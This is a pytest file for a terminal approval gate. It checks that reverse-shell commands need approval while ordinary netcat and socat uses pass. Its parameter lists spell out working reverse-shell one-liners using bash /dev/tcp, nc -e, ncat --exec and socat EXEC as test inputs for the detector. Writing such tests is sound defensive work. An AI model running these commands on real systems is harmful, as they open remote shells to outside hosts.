"""Reverse-shell spellings Skills Guard already flags must also need approval at the terminal gate (#17873)."""

import pytest

from tools.approval import detect_dangerous_command


@pytest.mark.parametrize("command", [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "sh -i 5<>/dev/tcp/host/4444 0<&5",
    "exec 3<>/dev/udp/host/53",
    'bash -c "bash -i >& /dev/tcp/host/4444 0>&1"',
    "nc -e /bin/bash host 4444",
    "sudo nc -nve /bin/sh host 4444",
    "ncat -c bash host 4444",
    "ls; /usr/bin/ncat --exec /bin/sh host 4444",
    "socat tcp:host:4444 EXEC:/bin/bash",
    "socat TCP:host:4444 'SYSTEM:bash -li'",
    "nc h 1 -e /bin/sh",
    "cat x | nc -e /bin/sh host 1",
])
def test_reverse_shell_requires_approval(command):
    assert detect_dangerous_command(command)[0] is True


@pytest.mark.parametrize("command", [
    'echo "bash -i >& /dev/tcp/host/4444"',
    'git commit -m "detect nc -e and socat exec: shells"',
    "grep /dev/tcp notes.txt",
    "nc -zv host 80",
    "nc -z db 5432 && psql -c 'select 1'",
    "nc -zv h 80 || echo -e down",
    "socat TCP-LISTEN:80 TCP:h:80 & echo exec:started",
    "socat - tcp:host:80",
])
def test_reverse_shell_prose_and_plain_netcat_not_flagged(command):
    assert detect_dangerous_command(command)[0] is False
